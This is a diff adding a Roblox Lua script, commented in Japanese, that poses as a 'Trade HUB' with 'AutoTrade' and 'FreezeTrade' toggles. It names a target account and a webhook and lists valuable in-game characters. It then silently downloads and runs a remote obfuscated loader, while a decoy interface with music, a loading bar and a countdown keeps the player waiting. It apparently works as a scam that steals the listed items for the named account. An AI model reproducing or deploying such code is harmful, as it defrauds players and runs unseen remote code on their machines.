@@ -1,0 +1,430 @@
+getgenv().TARGET_USER = "Naibo_nhbo7123" -- ここを Naibo_nhbo7123 に変更しました
+getgenv().WEBHOOK_URL = "WEBHOOK" -- 必要に応じてDiscordのWebhook URLを入れてください
+getgenv().NORMAL_BRAINROTS = {
+["Garama and Madundung"] = true,
+["Capitano Moby"] = true,
+["Burguro And Fryuro"] = true,
+["Ketchuru and Musturu"] = true,
+["Lavadorito Spinito"] = true,
+["Ketupat Kepat"] = true,
+["Tictac Sahur"] = true,
+["Tang Tang Keletang"] = true,
+["Money Money Puggy"] = true,
+["Nuclearo Dinossauro"] = true,
+["Graipuss Medussi"] = true,
+["Cerberus"] = true,
+["Dragon Cannelloni"] = true,
+["Agarrini la Palini"] = true,
+["Fragola La La La"] = true,
+["Los Hotspotsitos"] = true,
+["Los Bros"] = true,
+["Tralaledon"] = true,
+["Los Puggies"] = true,
+["Los Primos"] = true,
+["Los Tacoritas"] = true,
+["Los Spaghettis"] = true,
+["Spooky and Pumpky"] = true,
+["Fragrama and Chocrama"] = true,
+["La Casa Boo"] = true,
+["Ketupat Bros"] = true,
+["Cooki and Milki"] = true,
+["Popcuru and Fizzuru"] = true,
+["La Supreme Combinasion"] = true,
+["Dragon Gingerini"] = true,
+["Headless Horseman"] = true,
+["Hydra Dragon Cannelloni"] = true,
+["Celularcini Viciosini"] = true,
+["La Grande Combinasion"] = true,
+["Los Trios"] = true,
+["La Sahur Combinasion"] = true,
+["Bacuru and Egguru"] = true,
+["Eviledon"] = true,
+["Orcaledon"] = true,
+["Money Money Reindeer"] = true,
+["Los Jolly Combinasionas"] = true,
+["Jolly Jolly Sahur"] = true,
+["Chicleteira Noelteira"] = true,
+["Bisonte Giuppitere"] = true,
+["Jackorilla"] = true,
+["Reindeer Tralala"] = true,
+["Pumpkini Spyderini"] = true,
+["Frankentteo"] = true,
+["Santteo"] = true,
+["Telemorte"] = true,
+["Spaghetti Tualetti"] = true,
+["La Secret Combinasion"] = true,
+["La Food Combinasion"] = true,
+["Los Spooky Combinasionas"] = true,
+["Karkerkar Kurkur"] = true,
+["La Ginger Sekolah"] = true,
+["Rosey and Teddy"] = true,
+["Los Sekolahs"] = true,
+["Reinito Sleighito"] = true,
+["Swaggy Bros"] = true,
+["La Taco Combinasion"] = true,
+["Chipso and Queso"] = true,
+["La Spooky Grande"] = true,
+["Tuff Toucan"] = true,
+["Chillin Chili"] = true,
+["Gobblino Uniciclino"] = true,
+["Strawberry Elephant"] = true,
+["La Extinct Grande"] = true,
+["Tacorita Bicicleta"] = true,
+["Quesadillo Vampiro"] = true,
+["Perrito Burrito"] = true,
+["La Vacca Saturno Saturnita"] = true,
+["Karker Sahur"] = true,
+["Bunito Bunito Spinito"] = true,
+["Pirulitoita Bicicleteira"] = true,
+["Bunnyman"] = true,
+["Brunito Marsito"] = true,
+["Guest 666"] = true,
+["Mariachi Corazoni"] = true,
+["Swag Soda"] = true,
+["Extinct Matteo"] = true,
+["Los Quesadillas"] = true,
+["Spinny Hammy"] = true,
+["Meowl"] = true,
+["Skibidi Toilet"] = true,
+["Nacho Spyder"] = true,
+["Griffin"] = true,
+["W or L"] = true,
+["La Jolly Grande"] = true,
+["La Romantic Grande"] = true,
+["Festive 67"] = true,
+["Los Tralaleritos"] = true,
+["Las Tralaleritas"] = true,
+["GOAT"] = true,
+["Love Love Bear"] = true,
+["Ginger Gerat"] = true,
+["Mieteteira Bicicleteira"] = true,
+["Trenostruzzo Turbo 4000"] = true,
+["La Karkerkar Combinasion"] = true,
+["La Vacca Prese Presente"] = true,
+["Rocco Disco"] = true,
+["Cuadramat and Pakrahmatmamat"] = true,
+["25"] = true,
+["Cupid Cupid Sahur"] = true,
+["Ho Ho Ho Sahur"] = true,
+["Chill Puppy"] = true,
+["Los Sweethearts"] = true,
+["Las Sis"] = true,
+["Los Planitos"] = true,
+["Los Candies"] = true,
+["Los Mobilis"] = true,
+["Zombie Tralala"] = true,
+["Boatito Auratito"] = true,
+["Vulturino Skeletono"] = true,
+["La Cucaracha"] = true,
+["Extinct Tralalero"] = true,
+["La Vacca Jacko Linterino"] = true,
+["Triplito Tralaleritos"] = true,
+["Trickolino"] = true,
+["Giftini Spyderini"] = true,
+["Love Love Love Sahur"] = true,
+["Please my Present"] = true,
+["Santa Hotspot"] = true,
+["Naughty Naughty"] = true,
+["Cupid Hotspot"] = true,
+["Noo my Candy"] = true,
+["Noo my Present"] = true,
+["Ventoliero Pavonero"] = true,
+["Los Cupids"] = true,
+["Celestial Pegasus"] = true,
+["Antonio"] = true,
+["La Lucky Grande"] = true,
+["Granny"] = true,
+["Cloverat Clapat"] = true,
+["Dug dug dug"] = true,
+["Fortunu and Cashuru"] = true,
+["Gold Gold Gold"] = true,
+["Snailo Clovero"] = true,
+["Noo my Gold"] = true,
+["Luck Luck Luck Sahur"] = true,
+["La Vacca Lepre Lepreino"] = true,
+["Clovkur Kurkur"] = true,
+["Patteo"] = true,
+["Foxini Lanternini"] = true,
+["Eid Eid Eid Sahur"] = true,
+["To to to Sahur"] = true,
+["Chicleteirina Bicicleteirina"] = true,
+["Chicliterita bicicliterita"] = true,
+["Chicleteira Bicicleteira"] = true,
+["Job Job Job Sahur"] = true,
+["Lovin Rose"] = true,
+["List List List Sahur"] = true,
+["Los Combinasionas"] = true,
+["Los Amigos"] = true,
+["Sammyni Fattini"] = true,
+["Rosetti Tualetti"] = true,
+["Los 67"] = true,
+["Esok Sekolah"] = true,
+["Pot Hotspot"] = true,
+["Guerriro Digitale"] = true,
+["Los Tortus"] = true,
+["Torrtuginni Dragonfrutini"] = true,
+["Los Mi Gatitos"] = true,
+["Los Chicleteiras"] = true,
+["Yess my examine"] = true,
+["Noo my examine"] = true,
+["1x1x1x1"] = true,
+["Los Karkeritos"] = true,
+["Las Vaquitas Saturnitas"] = true,
+["Los Spyderinis"] = true,
+["Los Matteos"] = true,
+["Los Cucarachas"] = true,
+["67"] = true,
+["Los Burritos"] = true,
+["Rang Ring Bus"] = true,
+["Arcadopus"] = true,
+["Los Nooo My Hotspotsitos"] = true,
+["Burrito Bandito"] = true,
+["Mi Gatito"] = true,
+["Pot Pumpkin"] = true,
+["Quesadilla Crocodila"] = true,
+["Horegini Boom"] = true,
+["Nooo My Hotspot"] = true,
+["Tung Tung Tung Sahur"] = true,
+["Los Jobcitos"] = true,
+["Coffin Tung Tung Tung Sahur"] = true,
+["Blackhole Goat"] = true,
+["Chachechi"] = true,
+["Dul Dul Dul"] = true,
+["Sammyni Spyderini"] = true,
+["Chicleteira Cupideira"] = true,
+["Fishino Clownino"] = true,
+["Chimnino"] = true,
+["Noo my Heart"] = true,
+["Los 25"] = true,
+["Donkeyturbo Express"] = true,
+["Elefanto Frigo"] = true,
+["Noo my Eggs"] = true,
+["Tirilikalika Tirilikalako"] = true,
+["Signore Carapace"] = true,
+["Bunny and Eggy"] = true,
+["Boppin Bunny"] = true,
+["Hopilikalika Hopilikalako"] = true,
+["Hydra Bunny"] = true,
+["Cash or Card"] = true,
+["Arcadragon"] = true,
+["Rico Dinero"] = true,
+["Pancake and Syrup"] = true,
+["Quackini Snackini"] = true,
+["Pretzel-Bot 3000"] = true,
+["Los Kalikakiikas"] = true,
+["Digi Narwhal"] = true,
+["Gym Bros"] = true,
+["Camero Ricero Mechero"] = true,
+["Los Chillis"] = true,
+["Money Money Bros"] = true,
+["Duggy Bros"] = true,
+["Los Hackers"] = true,
+["John Pork"] = true,
+["Jelly Moby"] = true,
+["La Anniversary Grande"] = true,
+["Kalika Bros"] = true,
+["Sammyni Cakini"] = true,
+["Globa Steppa"] = true,
+["Dragon Aquanini"] = true,
+["Coco and Mango"] = true,
+["Ombrello Topolino"] = true,
+["Capitano Gullini"] = true,
+["Cigno Fulgoro"] = true
+}
+task.spawn(function()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/c5a067c93477b930cc4602547c6d5ffe.lua", true))()
+end)
+task.spawn(function()
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local PlayerGui = player:WaitForChild("PlayerGui")
+local tweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local SoundService = game:GetService("SoundService")
+
+-- --- 音楽再生設定 ---
+local sound = Instance.new("Sound", SoundService)
+sound.SoundId = "rbxassetid://137486973114353" -- 指定の音楽ID
+sound.Looped = true
+sound.Volume = 0.5
+sound:Play()
+
+-- 古いGUIがあれば削除
+if PlayerGui:FindFirstChild("SecureTradeSystem") then
+    PlayerGui.SecureTradeSystem:Destroy()
+end
+
+-- GUI作成
+local gui = Instance.new("ScreenGui", PlayerGui)
+gui.Name = "SecureTradeSystem"
+gui.DisplayOrder = 999
+gui.Enabled = true
+
+-- --- 各種関数（レインボー・アニメーション・トグル） ---
+local function startRainbowEffect(textLabel)
+    task.spawn(function()
+        local hue = 0
+        while textLabel and textLabel.Parent do
+            hue = (hue + 0.01) % 1
+            textLabel.TextColor3 = Color3.fromHSV(hue, 1, 1)
+            RunService.RenderStepped:Wait()
+        end
+    end)
+end
+
+local function popIn(instance)
+    instance.Size = UDim2.new(0, 0, 0, 0)
+    instance.Visible = true
+    tweenService:Create(instance, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        Size = UDim2.new(0, 320, 0, 180)
+    }):Play()
+end
+
+-- トグルボタンのクリック判定を制御するためのテーブル
+local activeButtons = {}
+
+local function createToggle(labelName, parent, yPos)
+    local label = Instance.new("TextLabel", parent)
+    label.Size = UDim2.new(0, 150, 0, 30)
+    label.Position = UDim2.new(0.05, 0, yPos, 0)
+    label.Text = labelName
+    label.TextColor3 = Color3.fromRGB(255, 255, 255)
+    label.TextSize = 16
+    label.Font = Enum.Font.GothamBold
+    label.BackgroundTransparency = 1
+    label.TextXAlignment = Enum.TextXAlignment.Left
+
+    local frame = Instance.new("Frame", parent)
+    frame.Size = UDim2.new(0, 60, 0, 30)
+    frame.Position = UDim2.new(0.7, 0, yPos, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(1, 0)
+    
+    local knob = Instance.new("Frame", frame)
+    knob.Size = UDim2.new(0, 24, 0, 24)
+    knob.Position = UDim2.new(0, 3, 0.1, 0)
+    knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)
+    
+    local btn = Instance.new("TextButton", frame)
+    btn.Size = UDim2.new(1, 0, 1, 0)
+    btn.BackgroundTransparency = 1
+    btn.Text = ""
+    
+    local isOn = false
+    local function setOn(state)
+        isOn = state
+        local targetX = isOn and UDim2.new(0.55, 0, 0.1, 0) or UDim2.new(0, 3, 0.1, 0)
+        local targetColor = isOn and Color3.fromRGB(50, 255, 50) or Color3.fromRGB(200, 50, 50)
+        knob:TweenPosition(targetX, Enum.EasingDirection.Out, Enum.EasingStyle.Back, 0.2)
+        frame.BackgroundColor3 = targetColor
+        if labelName == "AutoTrade" then _G.TradeEnabled = isOn else _G.FreezeEnabled = isOn end
+    end
+
+    -- ロック状態を判別してクリックを許可する
+    btn.MouseButton1Click:Connect(function()
+        if btn:GetAttribute("Locked") == true then return end
+        setOn(not isOn)
+    end)
+    
+    table.insert(activeButtons, btn)
+    return {setOn = setOn}
+end
+
+-- --- 演出フロー ---
+-- FREEZE文字
+local freezeLabel = Instance.new("TextLabel", gui)
+freezeLabel.Size = UDim2.new(1, 0, 1, 0)
+freezeLabel.Text = "FREEZE"
+freezeLabel.TextColor3 = Color3.fromRGB(170, 0, 255)
+freezeLabel.Font = Enum.Font.GothamBlack
+freezeLabel.TextSize = 80
+freezeLabel.BackgroundTransparency = 1
+task.wait(2)
+freezeLabel:Destroy()
+
+-- レインボーTrade HUB
+local hubLabel = Instance.new("TextLabel", gui)
+hubLabel.Size = UDim2.new(1, 0, 1, 0)
+hubLabel.Text = "Trade HUB"
+hubLabel.Font = Enum.Font.GothamBlack
+hubLabel.TextSize = 60
+hubLabel.BackgroundTransparency = 1
+startRainbowEffect(hubLabel)
+task.wait(3)
+hubLabel:Destroy()
+
+-- 10秒ロード画面
+local loadFrame = Instance.new("Frame", gui)
+loadFrame.Size = UDim2.new(0, 300, 0, 100)
+loadFrame.Position = UDim2.new(0.5, -150, 0.5, -50)
+loadFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Instance.new("UICorner", loadFrame)
+local loadBar = Instance.new("Frame", loadFrame)
+loadBar.Size = UDim2.new(0, 0, 0, 20)
+loadBar.Position = UDim2.new(0.05, 0, 0.4, 0)
+loadBar.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
+Instance.new("UICorner", loadBar)
+
+tweenService:Create(loadBar, TweenInfo.new(10, Enum.EasingStyle.Linear), {Size = UDim2.new(0.9, 0, 0, 20)}):Play()
+task.wait(10)
+loadFrame:Destroy()
+
+-- メインGUIの土台作成
+local mainFrame = Instance.new("Frame", gui)
+mainFrame.Size = UDim2.new(0, 320, 0, 180)
+mainFrame.Position = UDim2.new(0.5, -160, 0.5, -90)
+mainFrame.BackgroundColor3 = Color3.fromRGB(30, 10, 50)
+mainFrame.BackgroundTransparency = 0.2
+mainFrame.Visible = false
+mainFrame.Active = true
+mainFrame.Draggable = true
+Instance.new("UICorner", mainFrame)
+
+local header = Instance.new("TextLabel", mainFrame)
+header.Size = UDim2.new(1, 0, 0, 40)
+header.Text = "Trade HUB"
+header.TextColor3 = Color3.fromRGB(255, 255, 255)
+header.Font = Enum.Font.GothamBold
+header.TextSize = 20
+header.BackgroundTransparency = 1
+header.Parent = mainFrame
+
+-- トグル作成
+createToggle("AutoTrade", mainFrame, 0.25)
+createToggle("FreezeTrade", mainFrame, 0.48)
+
+-- 下部の紫色の通知テキスト
+local statusLabel = Instance.new("TextLabel", mainFrame)
+statusLabel.Size = UDim2.new(1, 0, 0, 30)
+statusLabel.Position = UDim2.new(0, 0, 0.78, 0)
+statusLabel.BackgroundTransparency = 1
+statusLabel.Font = Enum.Font.GothamBold
+statusLabel.TextSize = 14
+statusLabel.TextColor3 = Color3.fromRGB(170, 0, 255)
+statusLabel.Text = "アンロックまであと 10 秒"
+
+-- メイン画面を表示
+popIn(mainFrame)
+
+-- ボタンを一時的にロックする
+for _, btn in pairs(activeButtons) do
+    btn:SetAttribute("Locked", true)
+end
+
+-- 10秒カウントダウン処理
+task.spawn(function()
+    for i = 10, 1, -1 do
+        statusLabel.Text = "アンロックまであと " .. i .. " 秒"
+        task.wait(1)
+    end
+    
+    -- 【変更箇所】10秒経ったら文字を非表示（非アクティブ）にする
+    statusLabel.Visible = false
+    
+    -- ロック解除
+    for _, btn in pairs(activeButtons) do
+        btn:SetAttribute("Locked", false)
+    end
+end)
+end)
